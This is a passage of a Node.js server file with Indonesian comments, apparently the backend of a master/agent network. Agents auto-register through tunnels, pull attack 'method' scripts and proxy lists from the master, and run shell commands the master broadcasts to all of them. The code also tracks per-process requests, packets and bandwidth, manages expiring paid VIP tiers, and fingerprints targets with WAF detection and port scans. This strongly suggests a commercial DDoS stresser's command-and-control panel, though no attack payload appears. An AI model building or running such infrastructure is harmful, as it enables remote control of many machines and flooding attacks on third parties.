  res.json({ status: 'ready' });
});

app.get('/livez', (_req, res) => res.json({ status: 'alive' }));

// Metrics ringkas
app.get('/api/metrics', validateApiKey, (_req, res) => {
  const { usedMemoryMB, totalMemoryMB, memoryUsagePercent } = getMemStats();
  res.json({
    wsClients: clients.size,
    activeProcesses: Object.keys(activeProcesses).length,
    proxy: proxyMetrics,
    sys: {
      load1m: Number(os.loadavg()[0].toFixed(2)),
      mem: {
        usedMB: usedMemoryMB,
        totalMB: totalMemoryMB,
        pct: memoryUsagePercent
      },
      uptimeSec: Math.floor(process.uptime())
    }
  });
});

app.get(
  '/api/agents/health',
  disableIfAgent(),
  validateApiKey,
  async (_req, res) => {
    loadAgents();
    const results = [];

    for (const agent of AGENT_LIST) {
      if (!agent.enabled) continue;

      try {
        const start = Date.now();
        // eslint-disable-next-line no-await-in-loop
        const response = await axiosProxyAware(
          {
            method: 'get',
            url: `${agent.url}/api/health`,
            timeout: 30000,
            validateStatus: (s) => s >= 200 && s < 300
          },
          { useProxy: false }
        );
        const ping = Date.now() - start;

        results.push({
          agent,
          status: 'success',
          data: { ...response.data, ping }
        });
        agent.failCount = 0;
      } catch (err) {
        agent.failCount = (agent.failCount || 0) + 1;
        results.push({ agent, status: 'error', error: err.message });

        if (agent.enabled === false && agent.failCount >= 3) {
          agent.failCount = 0;
          agent.enabled = true;
          logActivity('AGENT_RE_ENABLED', { agent });
          saveAgentsAndFlush();
        }
      }
    }

    res.json(results);
    broadcastWS({ type: 'agent_health', agents: results });
  }
);

// Agent health marker periodik
setInterval(async () => {
  try {
    loadAgents();
    const now = Date.now();
    let changed = false;
    const toDelete = [];

    for (let i = 0; i < AGENT_LIST.length; i++) {
      const agent = AGENT_LIST[i];
      if (!agent) continue;

      let isHealthy = false;
      for (let retry = 0; retry < 3; retry++) {
        try {
          // eslint-disable-next-line no-await-in-loop
          await axiosProxyAware(
            {
              method: 'get',
              url: `${agent.url}/api/health`,
              timeout: 30000,
              validateStatus: (s) => s >= 200 && s < 300
            },
            { useProxy: false }
          );
          isHealthy = true;
          break;
        } catch {
          if (retry < 2) {
            // eslint-disable-next-line no-await-in-loop
            await waitMs(1000 + Math.floor(Math.random() * 300));
          }
        }
      }

      if (isHealthy) {
        if (!agent.enabled) {
          agent.enabled = true;
          logActivity('AGENT_RE_ENABLED', { agent });
          broadcastWS({ type: 'agent_status_update', agent });
          try {
            // eslint-disable-next-line no-await-in-loop
            saveAgentsAndFlush();
          } catch (e) {
            logActivity('SAVE_AGENTS_ERROR', { error: e.message });
          }
        }
        agent.lastOnline = now;
      } else {
        const registeredAtTime = agent.registeredAt
          ? new Date(agent.registeredAt).getTime()
          : now;
        const lastOnlineTime = agent.lastOnline || registeredAtTime;
        const offlineDuration = now - lastOnlineTime;

        if (offlineDuration > 3 * 60 * 1000) {
          if (AUTO_DELETE_AGENT) {
            logActivity('AGENT_DELETED_OFFLINE', {
              agent,
              reason: 'Offline > 3 menit'
            });
            broadcastWS({ type: 'agent_deleted', agent });
            toDelete.push(i);
            changed = true;
          } else if (agent.enabled !== false) {
            agent.enabled = false;
            logActivity('AGENT_MARKED_OFFLINE', {
              agent,
              reason: 'Offline > 3 menit'
            });
            broadcastWS({ type: 'agent_status_update', agent });
            changed = true;
          }
        }
      }
    }

    for (let i = toDelete.length - 1; i >= 0; i--)
      AGENT_LIST.splice(toDelete[i], 1);
    if (changed) {
      try {
        saveAgentsAndFlush();
      } catch (e) {
        logActivity('SAVE_AGENTS_ERROR', { error: e.message });
      }
    }
  } catch (e) {
    logActivity('AGENT_HEALTH_LOOP_ERROR', {
      error: e?.message || String(e)
    });
  }
}, 5_000);

// Hostcheck
app.get('/api/hostcheck', disableIfAgent(), validateApiKey, async (req, res) => {
  const host = req.query.host;
  if (!host) return res.status(400).json({ error: 'Host tidak diberikan' });

  try {
    let urlToTest = host;
    if (!/^https?:\/\//i.test(host)) urlToTest = `http://${host}`;
    const parsed = new URL(urlToTest);
    const hostname = parsed.hostname;

    let resolvedIp = '';
    try {
      const dnsRes = await dns.lookup(hostname);
      resolvedIp = dnsRes.address;
    } catch {
      resolvedIp = hostname;
    }

    let online = false;
    let latency = null;
    let errorCode = null;

    try {
      const start = Date.now();
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);
      const resp = await fetch(
        urlToTest,
        { signal: controller.signal },
        { useProxy: PROXY_RUNTIME.enabled }
      );
      clearTimeout(timeout);

      latency = Date.now() - start;
      if (resp.ok || (resp.status >= 200 && resp.status < 500)) online = true;
      else errorCode = resp.status;
    } catch (e) {
      latency = null;
      errorCode =
        e.name === 'AbortError'
          ? 'TIMEOUT'
          : e.code || e.message || 'FETCH_ERROR';
    }

    let ipInfo = {};
    try {
      const controller2 = new AbortController();
      const t2 = setTimeout(() => controller2.abort(), 5000);
      const ipInfoRes = await fetch(
        `https://ipwho.is/${resolvedIp}`,
        { signal: controller2.signal },
        { useProxy: PROXY_RUNTIME.enabled }
      );
      ipInfo = await ipInfoRes.json();
      clearTimeout(t2);
    } catch {}

    return res.json({
      status: online ? 'online' : 'offline',
      latency,
      errorCode: online ? null : errorCode,
      ip: ipInfo.ip || resolvedIp,
      asn: ipInfo.connection?.asn || null,
      org: ipInfo.connection?.org || null,
      isp: ipInfo.connection?.isp || null,
      country: ipInfo.country || null,
      region: ipInfo.region || null,
      city: ipInfo.city || null,
      latitude: ipInfo.latitude || null,
      longitude: ipInfo.longitude || null
    });
  } catch (e) {
    return res
      .status(500)
      .json({ error: 'Gagal memeriksa host', detail: e.message });
  }
});

// Fingerprint full
app.get('/api/fingerprint-full', disableIfAgent(), validateApiKey, async (req, res) => {
  const target = req.query.target;
  if (!target)
    return res
      .status(400)
      .json({ error: "Parameter 'target' diperlukan" });

  try {
    const result = {
      target,
      urlInfo: {},
      dnsInfo: {},
      wafDetection: null,
      whois: {},
      geo: {},
      openPorts: [],
      error: null
    };

    const urlToTest = /^https?:\/\//.test(target)
      ? target
      : `http://${target}`;
    const parsed = new URL(urlToTest);
    const hostname = parsed.hostname;

    try {
      const dnsRes = await dns.lookup(hostname);
      result.dnsInfo.ip = dnsRes.address;
    } catch {
      result.dnsInfo.ip = null;
    }

    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);
      const head = await fetch(
        urlToTest,
        { method: 'HEAD', signal: controller.signal },
        { useProxy: PROXY_RUNTIME.enabled }
      );
      clearTimeout(timeout);

      const headers = {};
      head.headers.forEach((v, k) => (headers[k.toLowerCase()] = v));

      result.urlInfo.headers = headers;
      result.urlInfo.status = head.status;
      result.urlInfo.server = headers['server'] || null;
      result.urlInfo.poweredBy = headers['x-powered-by'] || null;

      if (
        headers['server']?.toLowerCase().includes('cloudflare') ||
        headers['cf-ray']
      ) {
        result.wafDetection = 'Cloudflare';
      } else if (headers['x-sucuri-id']) {
        result.wafDetection = 'Sucuri';
      } else if (headers['x-akamai-transformed']) {
        result.wafDetection = 'Akamai';
      } else if (headers['x-cdn']) {
        result.wafDetection = `CDN - ${headers['x-cdn']}`;
      }
    } catch (e) {
      result.urlInfo.error = 'Gagal ambil header: ' + e.message;
    }

    try {
      const whoisData = await whois(hostname);
      result.whois = {
        asn: whoisData.asn || whoisData.origin || null,
        org: whoisData.org || whoisData.OrgName || null,
        country: whoisData.country || whoisData.Country || null
      };
    } catch (e) {
      result.whois = { error: e.message };
    }

    try {
      if (result.dnsInfo.ip) {
        const controller3 = new AbortController();
        const t3 = setTimeout(() => controller3.abort(), 5000);
        const ipInfoRes = await fetch(
          `https://ipwho.is/${result.dnsInfo.ip}`,
          {
            signal: controller3.signal
          },
          { useProxy: PROXY_RUNTIME.enabled }
        );
        const ipInfo = await ipInfoRes.json();
        clearTimeout(t3);

        result.geo = {
          asn: ipInfo.connection?.asn,
          org: ipInfo.connection?.org,
          isp: ipInfo.connection?.isp,
          country: ipInfo.country,
          city: ipInfo.city,
          region: ipInfo.region
        };
      }
    } catch (e) {
      result.geo = { error: e.message };
    }

    if (result.dnsInfo.ip) {
      try {
        result.openPorts = await scanCommonPorts(result.dnsInfo.ip);
      } catch (e) {
        result.openPortsError = e.message;
      }
    }

    res.json(result);
  } catch (e) {
    res.status(500).json({ error: 'Gagal fingerprint', detail: e.message });
  }
});

// Activity log
app.get('/api/activity-log', disableIfAgent(), validateApiKey, (_req, res) => {
  const logPath = path.join(dataDir, 'activity.log');
  if (!fs.existsSync(logPath)) return res.send('');
  res
    .set('Content-Type', 'text/plain')
    .send(fs.readFileSync(logPath, 'utf8'));
});

app.delete('/api/activity-log', disableIfAgent(), validateApiKey, (_req, res) => {
  const logPath = path.join(dataDir, 'activity.log');
  fs.writeFileSync(logPath, '');
  res.json({ message: 'Log cleared' });
});

// Admin tools: toggle telegram, reload config, export/import
app.post('/api/toggle-telegram', disableIfAgent(), validateApiKey, (req, res) => {
  const mode = (req.query.mode || '').toLowerCase();
  if (mode === 'on') TELEGRAM_ENABLED = true;
  else if (mode === 'off') TELEGRAM_ENABLED = false;
  else return res.status(400).json({ error: 'mode harus on|off' });
  res.json({ message: 'ok', enabled: TELEGRAM_ENABLED });
});

app.post(
  '/api/admin/reload-config',
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  async (_req, res) => {
    const before = {
      SUPABASE_URL,
      MASTER_URL,
      TELEGRAM_CHAT_ID,
      PROXY_CHECKER_URL
    };
    await fetchConfig();
    const after = {
      SUPABASE_URL,
      MASTER_URL,
      TELEGRAM_CHAT_ID,
      PROXY_CHECKER_URL
    };
    res.json({ message: 'config reloaded', before, after });
  }
);

const EXPORTABLE_FILES = [
  methodsPath,
  agentsPath,
  newsPath,
  historyPath,
  configPath
];

app.get(
  '/api/admin/export',
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  validateApiKey,
  async (_req, res) => {
    const payload = {};
    for (const p of EXPORTABLE_FILES) {
      const key = path.basename(p);
      payload[key] = readFileJsonSafe(p, null);
    }
    res.json({ exportedAt: new Date().toISOString(), data: payload });
  }
);

app.post(
  '/api/admin/import',
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  validateApiKey,
  express.json({ limit: '5mb' }),
  async (req, res) => {
    const data = req.body?.data;
    if (!data || typeof data !== 'object')
      return res.status(400).json({ error: 'payload tidak valid' });
    for (const [fileName, content] of Object.entries(data)) {
      const full = path.join(dataDir, fileName);
      if (!EXPORTABLE_FILES.includes(full)) continue;
      await writeFileJsonSafe(full, content);
    }
    _cachedMethods = null;
    _cachedConfig = null;
    res.json({ message: 'import selesai' });
  }
);

/* =============================================================================
 * 25) AGENT FILE SYNC APIs (MASTER <-> AGENT)
 * ========================================================================== */

app.post('/api/methods/delete-file', express.json(), validateApiKey, (req, res) => {
  loadAgents();
  const { filename } = req.body;
  if (!filename)
    return res.status(400).json({ error: 'Parameter filename diperlukan' });

  const filePath = path.join(uploadDir, filename);
  if (!fs.existsSync(filePath)) return res.json({ message: 'File sudah tidak ada' });

  try {
    fs.unlinkSync(filePath);
    logActivity('AGENT_DELETE_METHOD_FILE', { file: filename });
    res.json({ message: 'File dihapus di agent', file: filename });
  } catch (e) {
    logActivity('AGENT_DELETE_METHOD_FILE_FAIL', {
      file: filename,
      error: e.message
    });
    res
      .status(500)
      .json({ error: 'Gagal menghapus file', detail: e.message });
  }
});

// MASTER push update ke agent, atau agent menerima update
app.post('/api/update', validateApiKey, upload.single('file'), async (req, res) => {
  if (!req.file)
    return res.status(400).json({ error: 'Tidak ada file ter-upload' });

  const allowedExt = ['.js', '.sh'];
  const ext = path.extname(req.file.originalname).toLowerCase();
  if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });

  let moved = false;
  if (allowedExt.includes(ext)) {
    const destPath = path.join(uploadDir, req.file.originalname);
    fs.renameSync(req.file.path, destPath);
    moved = true;
    logActivity('RECEIVE_UPDATE_MOVE', {
      file: req.file.originalname,
      size: req.file.size
    });
  } else {
    moved = false;
    logActivity('RECEIVE_UPDATE_OTHER', {
      file: req.file.originalname,
      size: req.file.size
    });
  }

  let syncResult = null;
  if (NODE_TYPE === 'agent') {
    try {
      const { data } = await axiosProxyAware(
        {
          method: 'get',
          url: `${MASTER_URL}/api/methods`,
          params: { key: AGENT_KEY },
          timeout: 30000,
          validateStatus: (s) => s >= 200 && s < 300
        },
        { useProxy: false }
      );
      writeMethods(data);
      syncResult = {
        success: true,
        source: MASTER_URL,
        methodsCount: Object.keys(data).length
      };
      logActivity('AUTO_SYNC_METHODS_JSON', {
        from: MASTER_URL,
        size: Object.keys(data).length
      });
    } catch (err) {
      syncResult = { success: false, error: err.message, source: MASTER_URL };
      logActivity('AUTO_SYNC_METHODS_JSON_FAIL', {
        from: MASTER_URL,
        error: err.message
      });
    }
  }

  res.json({
    message: 'File update diterima',
    file: req.file.originalname,
    moved,
    mode: NODE_TYPE,
    sync: syncResult
  });
});

app.post(
  '/api/agent/update',
  validateApiKey,
  upload.single('file'),
  async (req, res) => {
    if (!req.file)
      return res.status(400).json({ error: 'Tidak ada file ter-upload' });

    loadAgents();
    const results = await Promise.all(
      AGENT_LIST.map((agent) => {
        const form = new FormData();
        form.append('key', AGENT_KEY);
        form.append(
          'file',
          fs.createReadStream(req.file.path),
          req.file.originalname
        );
        return axiosProxyAware(
          {
            method: 'post',
            url: `${agent.url}/api/update`,
            data: form,
            headers: form.getHeaders(),
            timeout: 30000,
            validateStatus: (s) => s >= 200 && s < 300
          },
          { useProxy: false }
        )
          .then((resp) => ({
            agent,
            status: 'success',
            data: resp.data
          }))
          .catch((e) => ({ agent, status: 'failed', error: e.message }));
      })
    );

    logActivity('PUSH_UPDATE', { file: req.file.filename, results });
    broadcastWS({ type: 'agent_update', results, file: req.file.filename });
    res.json({ message: 'Update didistribusikan', results });
  }
);

/* =============================================================================
 * 26) SHELL, TOGGLE-LOG, LOG-STATUS
 * ========================================================================== */

app.post(
  '/api/shell',
  limiterShell,
  validateApiKey,
  express.json(),
  async (req, res) => {
    const { command } = req.body;

    if (!command || typeof command !== 'string' || command.length > 500) {
      return res.status(400).json({ error: 'Command tidak valid' });
    }
    if (isForbiddenShell(command)) {
      return res.status(403).json({ error: 'Command terlarang.' });
    }
    if (/[;&|`$(){}\[\]]/.test(command)) {
      return res
        .status(400)
        .json({ error: 'Karakter shell berbahaya terdeteksi' });
    }

    if (NODE_TYPE === 'agent') {
      const proc = spawn('sh', ['-c', command]);
      let output = '';
      let error = '';

      proc.stdout.on('data', (d) => (output += d.toString()));
      proc.stderr.on('data', (d) => (error += d.toString()));

      proc.on('close', (code) => {
        if (code === 0) return res.json({ output });
        return res
          .status(500)
          .json({ error: `Code ${code}: ${error || output}` });
      });
      return;
    }

    if (NODE_TYPE === 'master') {
      try {
        loadAgents();
        const results = await Promise.all(
          AGENT_LIST.map((agent) =>
            axiosProxyAware(
              {
                method: 'post',
                url: `${agent.url}/api/shell`,
                data: { key: AGENT_KEY, command },
                timeout: 10000,
                validateStatus: (s) => s >= 200 && s < 300
              },
              { useProxy: false }
            )
              .then((r) => ({
                agent: agent.name,
                status: 'success',
                output: r.data.output
              }))
              .catch((e) => ({
                agent: agent.name,
                status: 'failed',
                error: e.message
              }))
          )
        );
        return res.json({ results });
      } catch (e) {
        return res
          .status(500)
          .json({ error: 'Gagal mengirim perintah ke agent' });
      }
    }
    return res.status(400).json({ error: 'NODE_TYPE tidak dikenal' });
  }
);

app.post('/api/toggle-log', disableIfAgent(), validateApiKey, (req, res) => {
  const mode = req.query.mode;
  if (mode === 'off') {
    global.DISABLE_LOG = true;
    return res.json({ message: '✅ Semua log dimatikan' });
  }
  if (mode === 'on') {
    global.DISABLE_LOG = false;
    return res.json({ message: '✅ Logging diaktifkan kembali' });
  }
  res
    .status(400)
    .json({ error: 'Parameter "mode" harus "on" atau "off"' });
});

app.get('/api/log-status', validateApiKey, (_req, res) =>
  res.json({ logging: global.DISABLE_LOG ? 'disabled' : 'enabled' })
);

/* =============================================================================
 * 27) CONFIG FETCH & AGENT AUTOMATION (TUNNEL, REGISTER, SYNC)
 * ========================================================================== */

async function fetchConfig(retries = 5, delay = 5000) {
  for (let attempt = 1; attempt <= retries; attempt++) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 10000);

    try {
      const res = await fetch(
        CONFIG_URL,
        { signal: controller.signal },
        { useProxy: false }
      );
      clearTimeout(timeoutId);

      if (!res.ok) throw new Error(`Status code ${res.status}`);
      const config = await res.json();

      SUPABASE_URL = config.SUPABASE_URL;
      SUPABASE_API_KEY = config.SUPABASE_API_KEY;
      MASTER_URL = config.MASTER_URL;
      TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
      TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;
      apiKey = config.apiKey || apiKey;
      AGENT_KEY = config.AGENT_KEY || AGENT_KEY;
      DEFAULT_PHOTO_URL = config.DEFAULT_PHOTO_URL || DEFAULT_PHOTO_URL;
      COOKIE_SECRET = config.COOKIE_SECRET || COOKIE_SECRET;
      PROXY_CHECKER_URL = config.PROXY_CHECKER_URL || PROXY_CHECKER_URL;

      const { createClient } = require('@supabase/supabase-js');
      supabase = createClient(SUPABASE_URL, SUPABASE_API_KEY);
      global.supabase = supabase;
      return;
    } catch (e) {
      clearTimeout(timeoutId);
      logActivity('FETCH_CONFIG_FAIL', { attempt, error: e.message });
      if (attempt < retries) await waitMs(delay);
      else logActivity('FETCH_CONFIG_ALL_FAIL', { error: e.message });
    }
  }
}
fetchConfig().then(() => {
  if (supabase) loadPlugins();
});

// Refresh config periodik
setInterval(() => fetchConfig(), 5 * 60 * 1000);

// Stats CPU/mem per PID (dashboard)
function startStatsMonitorLoop(interval = 1000) {
  setInterval(async () => {
    const pidMap = {};
    for (const [processId, proc] of Object.entries(activeProcesses)) {
      if (!proc?.ls?.pid) continue;
      pidMap[processId] = proc.ls.pid;
      stats[processId] ??= {
        rps: 0,
        pps: 0,
        bps: 0,
        _tempRps: 0,
        _tempPps: 0,
        _tempBps: 0
      };
    }

    const pidList = Object.values(pidMap);
    if (pidList.length === 0) return;

    try {
      const hasDashboardClient = clients.size > 0;
      if (!hasDashboardClient) return;
      if (!shouldRunPidusage()) return;

      const usage = await pidusage(pidList);
      for (const [processId, pid] of Object.entries(pidMap)) {
        const s = stats[processId];
        if (!s || !usage[pid]) continue;

        s.rps = s._tempRps;
        s.pps = s._tempPps;
        s.bps = Number((s._tempBps / 1_000_000).toFixed(2));
        s.cpuPercent = Number(usage[pid].cpu.toFixed(2));
        s.memoryMB = Math.round(usage[pid].memory / 1024 / 1024);
        s._tempRps = 0;
        s._tempPps = 0;
        s._tempBps = 0;
      }
    } catch (err) {
      logActivity('STATS_LOOP_ERROR', { error: err.message });
    }
  }, interval);
}
if (NODE_TYPE === 'master' || NODE_TYPE === 'agent') startStatsMonitorLoop();

// Auto downgrade user expired
async function autoDowngradeExpiredUsers() {
  try {
    if (!supabase) return;
    const { data: users, error } = await supabase
      .from('users')
      .select('username, role, expired_at')
      .in('role', ['vip', 'vvip', 'mvp']);

    if (error || !users) return;

    const now = new Date();
    for (const user of users) {
      if (user.expired_at && new Date(user.expired_at) < now) {
        await supabase
          .from('users')
          .update({ role: 'basic', expired_at: null })
          .eq('username', user.username);
        logActivity('AUTO_DOWNGRADE', {
          username: user.username,
          oldRole: user.role
        });
        await sendTelegramPhoto(
          `🔁 *Auto downgrade*\n` +
            `👤 *User:* \`${escapeTelegram(user.username)}\`\n` +
            `🪪 *Dari:* \`${user.role}\`\n` +
            `📉 *Menjadi:* \`basic\`\n` +
            `📅 *Status:* Expired`
        );
      }
    }
  } catch (e) {
    logActivity('AUTO_DOWNGRADE_ERROR', { error: e.message });
  }
}

// Public IP helper
async function getPublicIp() {
  try {
    const { data } = await axiosProxyAware(
      {
        method: 'get',
        url: 'https://api.ipify.org?format=json',
        timeout: 5000
      },
      { useProxy: PROXY_RUNTIME.enabled }
    );
    return data.ip;
  } catch (e) {
    logActivity('GET_PUBLIC_IP_FAIL', { error: e.message });
    return 'localhost';
  }
}

// Ping route
app.get('/ping', (req, res) => res.send('pong'));

// Agent: auto register ke master
async function autoRegisterToMaster(retries = 3) {
  if (NODE_TYPE !== 'agent') return;

  const publicIp = await getPublicIp();
  const publicUrl = `http://${publicIp}:${port}`;

  if (!localTunnelUrl) {
    currentTunnel = await startLocalTunnel(10);
    localTunnelUrl = currentTunnel?.url || null;
  }
  const tunnelUrl = localTunnelUrl;

  let agentName =
    LAST_REGISTERED.name || `srv${Math.floor(Math.random() * 10000)}`;

  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      const payload = {
        name: agentName,
        publicUrl,
        tunnelUrl,
        agentKey: AGENT_KEY,
        fingerprint: AGENT_FINGERPRINT
      };

      const { data } = await axiosProxyAware(
        {
          method: 'post',
          url: `${MASTER_URL}/api/agents/register`,
          data: payload,
          timeout: 20000,
          validateStatus: (s) => s >= 200 && s < 300
        },
        { useProxy: false }
      );

      LAST_REGISTERED = { name: agentName, url: data?.url || publicUrl };
      logActivity('AGENT_REGISTER_OK', {
        attempt,
        name: agentName,
        url: LAST_REGISTERED.url
      });
      return;
    } catch (e) {
      logActivity('AGENT_REGISTER_FAIL', { attempt, error: e.message });
      if (attempt < retries) await waitMs(2000 * attempt);
    }
  }
}

// LocalTunnel
async function startLocalTunnel(retryCount = 10) {
  let tunnel = null;
  for (let i = 1; i <= retryCount; i++) {
    try {
      // eslint-disable-next-line no-await-in-loop
      tunnel = await localtunnel({ port });
      if (tunnel.url) {
        localTunnelUrl = tunnel.url;

        try {
          const filePath = path.join(__dirname, 'local_url.txt');
          fs.writeFileSync(filePath, tunnel.url, 'utf8');
        } catch (err) {
          logActivity('SAVE_LT_URL_FAIL', { error: err.message });
        }

        tunnel.on('close', async () => {
          logActivity('TUNNEL_CLOSED_AUTO', { previousUrl: localTunnelUrl });
          localTunnelUrl = null;
          currentTunnel = null;
          await waitMs(1500);
          await restartTunnel();
        });

        return tunnel;
      }
      throw new Error('LocalTunnel tidak mengembalikan URL');
    } catch (err) {
      logActivity('LOCAL_TUNNEL_FAIL', {
        attempt: i,
        error: err.message
      });
      if (i === retryCount) {
        logActivity('LOCAL_TUNNEL_GIVEUP', { attempts: retryCount });
      } else {
        // eslint-disable-next-line no-await-in-loop
        await waitMs(30000);
      }
    }
  }
  return null;
}

async function restartTunnel() {
  if (_restartTunnelInProgress) return;
  _restartTunnelInProgress = true;
  try {
    if (currentTunnel?.close) {
      try {
        currentTunnel.close();
      } catch (closeErr) {
        logActivity('TUNNEL_CLOSE_FAIL', { error: closeErr.message });
      }
    }

    currentTunnel = null;
    localTunnelUrl = null;
    await waitMs(15000);
    currentTunnel = await startLocalTunnel(10);

    if (!currentTunnel || !currentTunnel.url) {
      logActivity('TUNNEL_RESTART_SKIP', {
        reason: 'No tunnel URL after retries'
      });
      return;
    }

    await autoRegisterToMaster();
    logActivity('TUNNEL_RESTART_SUCCESS', { newUrl: currentTunnel.url });
  } catch (err) {
    logActivity('TUNNEL_RESTART_FAIL', { error: err.message });
  } finally {
    _restartTunnelInProgress = false;
  }
}

// Recover tunnel bila mati
setInterval(async () => {
  if (NODE_TYPE !== 'agent') return;
  if (currentTunnel || localTunnelUrl) return;

  try {
    currentTunnel = await startLocalTunnel(10);
    if (currentTunnel?.url) {
      await autoRegisterToMaster();
      logActivity('TUNNEL_RECOVERY_SUCCESS', { newUrl: currentTunnel.url });
    } else {
      logActivity('TUNNEL_RECOVERY_FAILED', { reason: 'null url' });
    }
  } catch (err) {
    logActivity('TUNNEL_RECOVERY_EXCEPTION', { error: err.message });
  }
}, 30_000);

// Periksa health tunnel
async function checkTunnelHealth() {
  if (!localTunnelUrl) return;
  try {
    const resp = await axiosProxyAware(
      {
        method: 'get',
        url: localTunnelUrl,
        timeout: 30000,
        validateStatus: () => true
      },
      { useProxy: false }
    );
    if (resp.status === 503) {
      logActivity('TUNNEL_503_DETECTED', { url: localTunnelUrl });
      await restartTunnel();
    }
  } catch (err) {
    if (err.response?.status === 503) {
      logActivity('TUNNEL_503_DETECTED', { url: localTunnelUrl });
      await restartTunnel();
    }
  }
}

// Auto sync methods & files dari master ke agent
async function autoSyncFromMaster() {
  if (NODE_TYPE !== 'agent') return;
  try {
    const { data: methodsData } = await axiosProxyAware(
      {
        method: 'get',
        url: `${MASTER_URL}/api/methods`,
        params: { key: AGENT_KEY },
        timeout: 30000,
        validateStatus: (s) => s >= 200 && s < 300
      },
      { useProxy: false }
    );

    await writeFileJsonSafe(methodsPath, methodsData);
    _cachedMethods = methodsData;
    _lastMethodsRead = Date.now();

    logActivity('AUTO_SYNC_METHODS_JSON', {
      from: MASTER_URL,
      size: Object.keys(methodsData).length
    });

    const shouldHaveFiles = new Set(
      Object.values(methodsData)
        .map((m) => m.script)
        .filter(Boolean)
    );
    if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });

    const localFiles = fs
      .readdirSync(uploadDir)
      .filter((f) => f.endsWith('.js') || f.endsWith('.sh'));

    for (const file of localFiles) {
      if (!shouldHaveFiles.has(file)) {
        try {
          fs.unlinkSync(path.join(uploadDir, file));
          logActivity('AUTO_MIRROR_REMOVE_FILE', { file });
        } catch (e) {
          logActivity('AUTO_MIRROR_REMOVE_FAIL', {
            file,
            error: e.message
          });
        }
      }
    }

    for (const scriptName of shouldHaveFiles) {
      const localPath = path.join(uploadDir, scriptName);
      if (!fs.existsSync(localPath)) {
        try {
          const url = `${MASTER_URL}/lib/method/${encodeURIComponent(
            scriptName
          )}`;
          const resp = await axiosProxyAware(
            {
              method: 'get',
              url,
              responseType: 'stream',
              timeout: 30000,
              validateStatus: (s) => s >= 200 && s < 300
            },
            { useProxy: false }
          );
          const writer = fs.createWriteStream(localPath);
          await new Promise((resolve, reject) => {
            resp.data.pipe(writer);
            writer.on('finish', resolve);
            writer.on('error', reject);
          });
          logActivity('AUTO_SYNC_METHOD_FILE', { scriptName });
        } catch (err) {
          logActivity('AUTO_SYNC_METHOD_FILE_FAIL', {
            scriptName,
            error: err.message
          });
        }
      }
    }

    try {
      const proxyUrl = `${MASTER_URL}/proxy.txt`;
      const localProxyPath = path.join(__dirname, 'proxy.txt');
      const resp = await axiosProxyAware(
        {
          method: 'get',
          url: proxyUrl,
          responseType: 'stream',
          timeout: 30000,
          validateStatus: () => true
        },
        { useProxy: false }
      );
      if (resp.status === 200) {
        const writer = fs.createWriteStream(localProxyPath);
        await new Promise((resolve, reject) => {
          resp.data.pipe(writer);
          writer.on('finish', resolve);
          writer.on('error', reject);
        });
        logActivity('AUTO_SYNC_PROXY_TXT', { from: MASTER_URL });
      }
    } catch (err) {
      logActivity('AUTO_SYNC_PROXY_TXT_FAIL', {
        from: MASTER_URL,
        error: err.message
      });
    }
  } catch (err) {
    logActivity('AUTO_SYNC_METHODS_JSON_FAIL', {
      from: MASTER_URL,
      error: err.message
    });
  }
}

// Inisialisasi agent
if (NODE_TYPE === 'agent') {
  (async function initAgent() {
    await autoRegisterToMaster();

    setInterval(autoRegisterToMaster, 5 * 60 * 1000);

    autoSyncFromMaster();
    setInterval(autoSyncFromMaster, 2 * 60 * 1000);

    let lastUrl = null;
    setInterval(() => {
      if (localTunnelUrl && localTunnelUrl !== lastUrl) {
        logActivity('TUNNEL_URL_CHANGED', {
          oldUrl: lastUrl,
          newUrl: localTunnelUrl
        });
        lastUrl = localTunnelUrl;
        autoRegisterToMaster();
      }
    }, 30000);

    setInterval(checkTunnelHealth, 60_000);
  })();
}

/* =============================================================================
 * 28) PROXY CONTROL ROUTES (RUNTIME)
 * ========================================================================== */

app.get('/api/proxy/status', disableIfAgent(), validateApiKey, (_req, res) => {
  res.json({
    enabled: PROXY_RUNTIME.enabled,
    url: PROXY_RUNTIME.url,
    lastSwitchedAt: PROXY_RUNTIME.lastSwitchedAt,
    metrics: {
      totalRequests: proxyMetrics.totalRequests,
      viaProxyRequests: proxyMetrics.viaProxyRequests,
      success: proxyMetrics.success,
      failed: proxyMetrics.failed,
      avgLatencyMs: proxyMetrics.avgLatencyMs,
      lastError: proxyMetrics.lastError,
      lastErrorAt: proxyMetrics.lastErrorAt,
      histogram: { buckets: latencyBuckets, counts: proxyMetrics.hist }
    }
  });
});

app.post('/api/proxy/config', validateApiKey, express.json(), (req, res) => {
  const { url } = req.body || {};
  if (url !== null && typeof url !== 'string') {
    return res.status(400).json({ error: 'url harus string atau null' });
  }
  try {
    if (url === null || (typeof url === 'string' && url.trim() === '')) {
      applyProxyConfig({ url: null });
    } else {
      const s = String(url).trim();
      const ok =
        /^https?:\/\//i.test(s) || /^socks[45]?:\/\//i.test(s);
      if (!ok)
        return res.status(400).json({
          error: 'Skema proxy harus http(s):// atau socks4/5://'
        });
      applyProxyConfig({ url: s });
    }
    return res.json({
      message: 'Konfigurasi proxy diperbarui',
      enabled: PROXY_RUNTIME.enabled,
      url: PROXY_RUNTIME.url
    });
  } catch (e) {
    return res.status(500).json({ error: e.message });
  }
});

app.post('/api/proxy/toggle', validateApiKey, (req, res) => {
  const mode = (req.query.mode || req.body?.mode || '').toLowerCase();
  if (!mode || !['on', 'off', 'toggle'].includes(mode)) {
    return res.status(400).json({ error: 'mode harus on|off|toggle' });
  }
  const current = PROXY_RUNTIME.enabled;
  let next = current;
  if (mode === 'toggle') next = !current;
  else next = mode === 'on';

  applyProxyConfig({ enabled: next });

  res.json({
    message: 'Proxy ' + (next ? 'enabled' : 'disabled'),
    enabled: PROXY_RUNTIME.enabled,
    url: PROXY_RUNTIME.url
  });
});

app.post(
  '/api/proxy/reset-metrics',
  disableIfAgent(),
  validateApiKey,
  (_req, res) => {
    proxyMetrics.totalRequests = 0;
    proxyMetrics.viaProxyRequests = 0;
